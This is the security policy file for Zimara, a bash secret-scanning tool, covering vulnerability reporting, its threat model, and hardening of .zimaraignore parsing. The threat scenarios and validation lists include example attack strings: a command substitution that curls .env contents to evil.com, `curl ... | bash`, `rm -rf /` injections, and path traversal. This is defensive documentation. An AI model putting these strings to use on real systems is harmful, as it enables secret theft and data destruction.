# Security Policy

**Version:** 0.48.0  
**Published by:** Oob Skulden™

Yes, a security tool has a security policy. Because irony is alive and well, and also because bad guys don’t respect job titles.

-----

## Reporting Security Issues

Found a way to make Zimara do something it shouldn’t? Good catch. Here’s what to do:

**DO NOT open a public GitHub issue.** That’s like announcing you found the keys under the mat.

Instead:

### Primary: GitHub Security Advisories (Preferred)

Use GitHub’s private vulnerability reporting:

**Report here:** https://github.com/oob-skulden/zimara/security/advisories/new

This creates a private advisory that only maintainers can see. It’s secure, tracked, and built into GitHub.

**Include:**

- What you found
- How to reproduce it
- What goes wrong when it happens
- Any ideas for fixing it (optional but appreciated)


**Response Time:**

This is a solo open-source project. I aim to:

- **Within 1 week:** Acknowledge receipt and confirm it’s a real issue
- **Within 30 days:** Provide initial assessment and timeline for a fix
- **Within 60 days:** Release a patch or provide detailed status update

Life happens. If I’m slower than this, I’m probably dealing with something urgent IRL. The goal is responsible disclosure, not breaking speed records.

**What happens next:**

1. I validate the issue (may ask for clarification)
1. I develop and test a fix
1. I release a patched version
1. I credit you (unless you prefer anonymity)
1. I publish a security advisory with details

**Bug bounty program:** There isn’t one. This is a free bash script published on the internet. If you want compensation, I can offer heartfelt gratitude and your name in the credits. That’s the deal.

-----

## Zimara’s Security Model (Or: What Could Possibly Go Wrong?)

Zimara is a bash script that scans files for security problems. That’s a bit like asking a guard dog to guard itself. Here’s how we think about it:

### Threat Model

**What we assume:**

- **You’re running Zimara in a repo you trust** (or at least don’t actively distrust)
- **The repository content might be malicious** (that’s the whole point of scanning it)
- **Your system binaries are legit** (git, grep, find, bash — if these are compromised, you have bigger problems)
- **Attackers will try to exploit Zimara** (via crafted repo content, malicious .zimaraignore patterns, symlink tricks, etc.)
- **You have basic operational security** (not running as root, using reasonable file permissions, etc.)

**What we don’t assume:**

- That you read documentation (but you should)
- That you understand regex (but CHECK 04 hopes you do)
- That you won’t try to bypass findings with `--no-verify` (please don’t)
- That AWS will stop charging you when your leaked key gets used (they won’t)

### Security Boundaries

Things Zimara actively protects against:

✅ **Command injection via .zimaraignore**  
Patterns are validated with character whitelisting. No shell metacharacters, no argument injection, no path traversal. If you try `$(curl evil.com)` in .zimaraignore, Zimara will reject it and log a warning.

✅ **Symlink attacks in temp files**  
Temp files are created with `mktemp`, ownership-checked, and verified as regular files (not symlinks). We don’t trust filesystem race conditions.

✅ **Path traversal via user input**  
Target directory is canonicalized and validated against an allowlist. You can’t trick Zimara into scanning `/etc/passwd` by passing `../../etc`.

✅ **Execution of untrusted code from the repo**  
Zimara never `eval`s, `source`s, or executes content from the repository being scanned. It reads files and pattern-matches them. That’s it.

✅ **World-writable git hooks**  
CHECK 44 specifically looks for hooks that are writable by others. If your pre-commit hook has mode 777, Zimara will complain loudly.

✅ **Malicious binary substitution (best effort)**  
Critical binaries (git, grep, find) are resolved to absolute paths with trust validation. We prefer `/usr/bin/git` over whatever’s in `./git`. We also reject world-writable binaries.

Things Zimara does NOT protect against:

❌ **Compromised system binaries**  
If someone replaced your `/usr/bin/git` with a malicious version, Zimara will happily use it. Check your package signatures.

❌ **You running malicious code yourself**  
Zimara will tell you “hey, this looks sketchy” but it won’t stop you from running `curl http://evil.com | bash` if you really want to. Free will is a thing.

❌ **Supply chain attacks in dependencies**  
Zimara checks if you have npm audit issues (CHECK 14), but it doesn’t verify the integrity of npm itself, or that your node_modules aren’t haunted.

❌ **Social engineering**  
If someone convinces you to add `vendor/*` to .zimaraignore and then hides secrets in `vendor/`, that’s not a Zimara vulnerability. That’s a people problem.

❌ **Zero-day vulnerabilities in bash**  
Zimara is written in bash. If bash has a critical vulnerability, Zimara inherits it. Update your system.

❌ **Quantum computers**  
Not yet, anyway.

-----

## Known Limitations (The Fine Print)

Zimara is good at what it does, but it’s not magic. Here’s what to keep in mind:

### 1. Pattern Matching Has Limits

**False Positives:**  
Zimara uses regex patterns for secret detection. Sometimes legitimate code looks like a secret:

```javascript
const exampleKey = "AKIA00000000EXAMPLE1234"; // This triggers CHECK 04
```

That’s why .zimaraignore exists. Use it wisely.

**False Negatives:**  
Sophisticated attackers don’t hardcode secrets as `AWS_KEY=AKIA...`. They obfuscate, encode, split across files, or use other tricks. Zimara catches the obvious stuff. It’s not a substitute for proper secret management.

### 2. Git History Scanning Requires Full Clones

CHECK 17 scans git history for sensitive file extensions. If you `git clone --depth 1`, Zimara only sees one commit. Shallow clones are faster but incomplete.

For thorough scanning, use full clones or at least `git fetch --unshallow`.

### 3. .zimaraignore Can Hide Real Problems

This is by design but also the biggest footgun. If you add this to .zimaraignore:

```
src/*
```

You’ve just excluded your entire source directory from scanning. Congratulations, you’ve built a very fast security scanner that scans nothing.

**Defense:** Zimara warns you about overly broad patterns (`*`, `*/*`, etc.) but it won’t stop you. Adults get to make bad decisions.

### 4. Some Checks Are Heuristic

CHECK 20 (Output JS Key Exposure) looks for patterns that resemble API keys in JavaScript bundles. It’s not doing semantic analysis or control-flow tracking. It’s grep with anxiety.

This means:

- It might miss obfuscated keys
- It might flag commented-out code
- It won’t understand that the key is restricted to localhost

These are informed guesses, not guarantees.

### 5. Zimara Runs Locally

This is a feature, not a bug, but it has implications:

- **No central enforcement:** Developers can bypass hooks with `--no-verify`
- **No audit trail:** You don’t know if people are actually running it
- **No updates enforcement:** Old Zimara versions don’t auto-update

If you need centralized control, run Zimara in CI and enforce required checks there. See <INTEGRATION.md> for details.

-----

## Secure Usage Guidelines

### Running on Untrusted Repositories

Scanning a repo you don’t fully trust? (Third-party code, sketchy fork, cursed legacy system?) Here’s how to be careful:

**Platform note:** These examples assume Linux/macOS or Windows WSL 2. For native Windows support via Docker, see [INTEGRATION.md - Windows Support](INTEGRATION.md#windows-support-via-docker-desktop).

**Option 1: Container Isolation**

```bash
# One-time container scan (auto-removes after running)
docker run --rm -v $(pwd):/repo -w /repo ubuntu:22.04 bash -c "
  apt-get update -qq && apt-get install -y -qq git curl
  curl -sO https://raw.githubusercontent.com/[your-username]/zimara/main/zimara.sh
  chmod +x zimara.sh
  ./zimara.sh --non-interactive
"
```

This contains any potential exploitation within the container.

**Note:** Zimara works in Docker because it only needs bash + standard Unix tools.
Optional features (gitleaks, npm audit) require additional packages.

**For complete Docker documentation, including Dockerfiles, Windows support, and CI/CD examples, see [INTEGRATION.md - Docker Containers](INTEGRATION.md#docker-containers).**

**Option 2: VM Snapshot**

Run Zimara in a VM, take a snapshot first, revert after scanning. Paranoid but effective.

**Option 3: Read-Only Filesystem**

Mount the repo read-only if you’re only scanning (not fixing):

```bash
mount --bind -o ro /path/to/repo /mnt/scan-target
cd /mnt/scan-target
zimara --non-interactive
```

**Option 4: Trust But Verify**

Review .zimaraignore before trusting it. If you see:

```
*
```

Someone’s hiding something.

### Hook Security Best Practices

Pre-commit hooks execute code on every commit. That’s powerful and dangerous.

**Zimara’s hook security features:**

1. **Permission checking (CHECK 44):**  
   Warns if hooks are writable by others. Hooks should be mode 700 (owner-only).
1. **Absolute path resolution:**  
   Zimara resolves `git`, `grep`, `find` to absolute paths to prevent repo-local binary hijacking.
1. **.zimaraignore validation:**  
   Patterns are validated before use. Malicious patterns get rejected, not executed.

**What you should do:**

```bash
# After setting up hooks
chmod 700 .git/hooks/pre-commit

# Verify it's a regular file (not a symlink)
ls -la .git/hooks/pre-commit

# Check contents match what you expect
cat .git/hooks/pre-commit
```

**Red flags:**

- Hook owned by someone else
- Hook is world-writable (mode 777)
- Hook is a symlink pointing outside the repo
- Hook contains commands you don’t recognize

### .zimaraignore Security

The .zimaraignore file is powerful. With great power comes great potential to shoot yourself in the foot.

**Security features (v0.48.0):**

- **Character whitelist:** Only `a-z A-Z 0-9 . / - _ *` allowed
- **Pattern validation:** Rejects leading dashes, path traversal, absolute paths
- **Length limits:** 200 chars per pattern, 100 patterns total
- **Injection prevention:** No shell metacharacters, no command substitution

**What Zimara rejects:**

```
--exclude=secrets.txt    # Leading dash (argument injection)
../../../etc/passwd      # Path traversal
/var/log/*               # Absolute path
$(curl evil.com)         # Command substitution
test;rm -rf /            # Shell metacharacters
```

Each rejected pattern logs a warning but doesn’t break the scan.

**What you should reject:**

```
*                        # Excludes everything (defeats the purpose)
src/*                    # Excludes all source code (why even scan?)
```

These are technically valid but strategically stupid.

**Safe patterns:**

```
tests/fixtures/*         # Test data with fake secrets
vendor/third-party/*     # Code you don't control
node_modules/*           # Dependencies (already excluded by default)
dist/*                   # Build artifacts (use --only-output instead)
```

Always comment why you’re excluding something. Future you will thank present you.

-----

## Security Updates and Versioning

Zimara uses semantic versioning with security in mind:

### Version Numbers

**0.48.x (Patch releases)**

- Bug fixes
- Security fixes
- Documentation updates
- No breaking changes

**0.x.0 (Minor releases)**

- New checks
- New features
- Enhanced security validations
- Backward compatible

**x.0.0 (Major releases)**

- Breaking changes
- Major refactors
- Changes to CLI interface or exit codes
- Not backward compatible

### Security-Critical Updates

Security fixes are released as patch versions and noted clearly in:

1. **Release notes** — “SECURITY: Fixed command injection in .zimaraignore parsing”
1. **This file** — Updated with details after disclosure period
1. **Git tags** — Tagged with `security-fix-` prefix

If you’re using Zimara in production CI, pin to major.minor (e.g., `v0.48.x`) and update promptly when security patches drop.

### Disclosure Timeline

**Before public release:**

- 0-7 days: Validate report, confirm it’s real
- 7-30 days: Develop and test fix
- 30-60 days: Public disclosure (or sooner if actively exploited in the wild)

**After public release:**

- Patch version released with fix
- Security advisory published on GitHub
- This file updated with details

If you reported the issue, you get credited (unless you prefer anonymity).

**Reality check:** I’m one person doing this in spare time. If something critical drops during the holidays or when I’m dealing with a work emergency, timelines might slip. But I will communicate status and won’t ghost you.

-----

## Security Features by Version

Here’s what security hardening has been added over time:

### v0.48.0 (Current)

- ✅ .zimaraignore injection prevention (character whitelisting, pattern validation)
- ✅ Snippet output security (safe handling of binary files, line truncation)
- ✅ Enhanced path validation (canonical path checking, symlink detection)

### v0.47.0

- ✅ Git history scanning (CHECK 17)
- ✅ Hook permission checking (CHECK 44)
- ✅ Trusted binary resolution with world-writable rejection

### v0.46.0 and earlier

- ✅ Basic secret pattern matching
- ✅ Private key detection
- ✅ Temp file security (ownership checks, cleanup traps)

See CHANGELOG.md for complete version history.

-----

## Threat Scenarios and Mitigations

Here’s how Zimara handles specific attack scenarios:

### Scenario 1: Malicious .zimaraignore

**Attack:** Attacker adds malicious patterns to .zimaraignore to execute commands:

```
$(curl http://evil.com/exfil?data=$(cat .env | base64))
```

**Mitigation:**  
Pattern validation rejects this immediately. Character whitelist only allows `a-z A-Z 0-9 . / - _ *`. The pattern is logged as rejected and ignored.

**Result:** Attack fails, warning logged, scan continues.

### Scenario 2: Symlink Attack on Temp Files

**Attack:** Attacker creates a symlink in /tmp before Zimara creates temp files, hoping to trick Zimara into writing to an attacker-controlled location.

**Mitigation:**  
Zimara uses `mktemp` which is race-safe, then explicitly checks:

- File exists
- File is a regular file (not symlink)
- File is owned by current user

**Result:** Attack fails, Zimara exits with error.

### Scenario 3: Command Injection via File Content

**Attack:** Attacker creates a file with a name like:

```
; rm -rf /.txt
```

Hoping that Zimara’s file processing will execute the command.

**Mitigation:**  
Zimara uses `find -print0 | xargs -0` for null-delimited processing, and all grep operations use fixed patterns or properly escaped regex. Filenames are never passed to shell evaluation.

**Result:** Attack fails. File is scanned like any other file.

### Scenario 4: Path Traversal via Target Directory

**Attack:** User runs:

```bash
zimara ../../../../../../etc
```

Hoping to scan system files they shouldn’t access.

**Mitigation:**  
Target directory is canonicalized with `cd` + `pwd -P`, then validated against an allowlist of safe locations (current working tree, user home, /tmp). Zimara refuses to scan `/etc` or other system directories.

**Result:** Attack fails with error: “Refusing to scan outside allowed paths”

### Scenario 5: Binary Substitution

**Attack:** Attacker places a malicious `git` binary in the repo root, hoping Zimara will use it:

```bash
./git  # Malicious script
```

**Mitigation:**  
Zimara resolves critical binaries to absolute paths using a safe PATH that excludes `.` (current directory). It prefers `/usr/bin/git` over anything in the repo. Additionally, it checks for world-writable binaries and rejects them.

**Result:** Attack fails. Zimara uses system git, not repo git.

-----

## What We Won’t Fix (And Why)

Some things are limitations, not bugs:

### 1. False Positives in Pattern Matching

**Issue:** Zimara flags test fixtures with fake API keys.

**Why we won’t “fix” it:**  
This is working as designed. Use .zimaraignore for legitimate test data. The alternative (trying to detect “fake” vs “real” keys) is impossible without a ground-truth database.

**Mitigation:** Document your test fixtures in .zimaraignore.

### 2. Developers Bypassing with –no-verify

**Issue:** Developers can skip pre-commit hooks with `git commit --no-verify`.

**Why we won’t “fix” it:**  
This is a Git feature, not a Zimara bug. If you need enforcement, use CI. See <INTEGRATION.md>.

**Mitigation:** Run Zimara in CI with required checks.

### 3. Performance on Giant Repos

**Issue:** Zimara is slow on repos with 100,000+ files.

**Why we won’t “fix” it:**  
Zimara uses grep and find, which are fast for normal repos but linear-time on file count. The alternative (complex indexing, binary dependencies) defeats the “simple bash script” design goal.

**Mitigation:** Use `--only-output` to scan just build artifacts, or exclude large directories with .zimaraignore.

### 4. No Protection Against Compromised System

**Issue:** If `/usr/bin/git` is compromised, Zimara is compromised.

**Why we won’t “fix” it:**  
If your system binaries are compromised, you have a root-level compromise. Zimara can’t defend against that. Neither can any other userspace tool.

**Mitigation:** Verify your system package signatures. Run Zimara in a container if you’re paranoid.

-----

## Compliance and Auditing

Zimara itself doesn’t generate compliance reports, but here’s how it fits into compliance frameworks:

### SOC 2 / ISO 27001

**Relevant controls:**

- CC6.1: Logical access security (Zimara helps prevent credential exposure)
- CC7.2: Detection of security incidents (Zimara detects pre-commit security issues)

**Audit evidence:**

- CI logs showing Zimara runs
- Git history showing Zimara integration commits
- .zimaraignore with documented exclusions

### PCI-DSS

**Relevant requirements:**

- 6.3.2: Review custom code for vulnerabilities (Zimara assists with secret detection)
- 8.2.1: Strong authentication (Zimara prevents credential leaks)

**Not sufficient alone:** Zimara is a pre-commit check, not a SAST tool. You’ll need additional tooling for full PCI compliance.

### NIST Cybersecurity Framework

**Relevant functions:**

- **Identify:** Asset management (CHECK 31 large files, CHECK 19 sensitive filenames)
- **Protect:** Access control (CHECK 03 private keys, CHECK 04 secrets)
- **Detect:** Security monitoring (all checks)

Zimara is an “Identify” and “Protect” control. It’s not “Respond” or “Recover.”

-----

## Responsible Disclosure Examples

Here’s how we’d handle a real security issue:

### Example 1: Command Injection in .zimaraignore (Hypothetical)

**Day 0:** Security researcher reports via GitHub Security Advisory: “Found command injection in .zimaraignore parsing”

**Day 3:** I confirm the issue, assign CVE (if warranted), start developing fix

**Day 14:** Fix developed, tested against researcher’s PoC, works correctly

**Day 21:** Release v0.48.1 with patch, security advisory published

**Day 22:** This file updated with details, researcher credited

**Advisory:**

```
SECURITY ADVISORY: Command Injection in .zimaraignore (CVE-2025-XXXXX)

Severity: High
Affected: v0.47.0 - v0.48.0
Fixed: v0.48.1

Description: Improper validation of .zimaraignore patterns allowed command 
injection via crafted pattern strings.

Mitigation: Update to v0.48.1 or later. If unable to update immediately, 
review .zimaraignore for suspicious patterns and remove them.

Credit: Jane Researcher (@security_jane)
```

### Example 2: Information Disclosure via Verbose Mode (Hypothetical)

**Day 0:** User reports via GitHub: “Zimara –verbose leaks secrets in log output”

**Day 5:** I investigate, confirm that snippet output can echo secrets when they’re found

**Day 12:** I add secret masking to snippet output, release v0.48.2

**Day 13:** Advisory published, this file updated

**Advisory:**

```
SECURITY ADVISORY: Potential Secret Disclosure in Verbose Output

Severity: Low (requires verbose mode + logging)
Affected: v0.48.0 - v0.48.1
Fixed: v0.48.2

Description: When running with --verbose, Zimara's snippet output could 
display detected secrets in full. This is only a concern if verbose output 
is logged to an insecure location.

Mitigation: Update to v0.48.2 which masks detected secrets in output. 
Or avoid using --verbose in CI with secret logging.

Credit: Internal testing
```

-----

## Security Contact

For security issues, contact via:

**Primary:** GitHub Security Advisories (private reporting)  
→ https://github.com/oob-skulden/zimara/security/advisories/new

**Response Time:**

- Acknowledgment: Within 1 week
- Initial assessment: Within 30 days
- Fix timeline: Case by case, but I take security seriously

**What NOT to report:**

- “Zimara didn’t catch my secret” — that’s a feature request, not a vulnerability
- “I bypassed Zimara with –no-verify” — that’s Git, not Zimara
- “Zimara is slow” — that’s a performance issue, not a security issue

**What TO report:**

- Command injection
- Path traversal
- Privilege escalation
- Information disclosure
- Anything that lets Zimara do something it shouldn’t

-----

## Acknowledgments

Security researchers who’ve helped make Zimara better:

(This section will be updated as researchers report issues)

- **Your name here?** — Found a bug? Report it responsibly and get credited.

-----

## Philosophical Note on Security Tools

Zimara is a security tool. That means it gets attacked. That’s not paranoia, that’s reality.

We take security seriously because:

1. **Trust is earned.** You’re running our code on your repos. That’s a privilege.
1. **We eat our own dog food.** Zimara scans itself before every release.
1. **Security tools that aren’t secure are worse than no tools.** They create false confidence.

But also:

- **Zimara is a bash script.** It’s not a fortress. It’s a flashlight.
- **Perfect security doesn’t exist.** We aim for “reasonable given the threat model.”
- **Users are part of the security model.** Don’t commit secrets. Use .zimaraignore responsibly. Run updates.

If you find a way to break Zimara, tell us. We’ll fix it, credit you, and make it better.

That’s the deal.

-----

**Want to contribute security improvements?**  
Pull requests welcome. See <CONTRIBUTING.md> (if you have one)

**To enable GitHub Security Advisories on your fork:**  
Settings → Code security and analysis → Enable “Private vulnerability reporting”

**Published by Oob Skulden™**  
The threats you don’t see coming.